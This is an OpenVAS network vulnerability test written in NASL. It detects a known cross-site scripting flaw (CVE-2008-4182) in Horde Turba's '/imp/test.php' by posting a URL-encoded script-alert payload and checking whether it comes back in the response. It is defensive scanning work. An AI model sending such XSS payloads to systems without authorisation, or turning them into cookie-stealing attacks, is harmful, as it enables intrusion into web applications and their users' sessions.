###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horde_31168.nasl 14 2013-10-27 12:33:37Z jan $
#
# Horde Turba Contact Manager '/imp/test.php' Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Turba Contact Manager is prone to a cross-site scripting vulnerability
because it fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may let the attacker steal cookie-based authentication
credentials and launch other attacks.

Note that this issue also affects Turba on Horde IMP.

Turba Contact Manager H3 2.2.1 is vulnerable; other versions may also
be affected.";

tag_solution = "Updates are available. Please see the references for more information.";

if (description)
{
 script_id(100724);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-07-27 20:48:46 +0200 (Tue, 27 Jul 2010)");
 script_bugtraq_id(31168);
 script_cve_id("CVE-2008-4182");

 script_name("Horde Turba Contact Manager '/imp/test.php' Cross Site Scripting Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/31168");
 script_xref(name : "URL" , value : "http://www.horde.org/turba/");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_description(desc);
 script_summary("Determine if Horde is prone to a cross-site scripting vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"imp")){
  exit(0);
}


ex = string("server=%3Cscript%3Ealert%28%27openvas-xss-test%27%29%3C%2Fscript%3E&port=1&user=2&passwd=3&server_type=imap&f_submit=Submit");
url = string(dir, "/test.php"); 
host = get_host_name();

req = string("POST ", url, " HTTP/1.1\r\n", 
  	     "Host: ", host, ":", port, "\r\n",
	     "Accept-Encoding: identity\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n", 
	     "Content-Length: ", strlen(ex), 
	     "\r\n\r\n", 
	     ex);

result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if(result == NULL)continue;

if(egrep(pattern:"<script>alert\('openvas-xss-test'\)</script>", string:result, icase: TRUE)) {
  security_warning(port:port);
  exit(0);
}

exit(0);

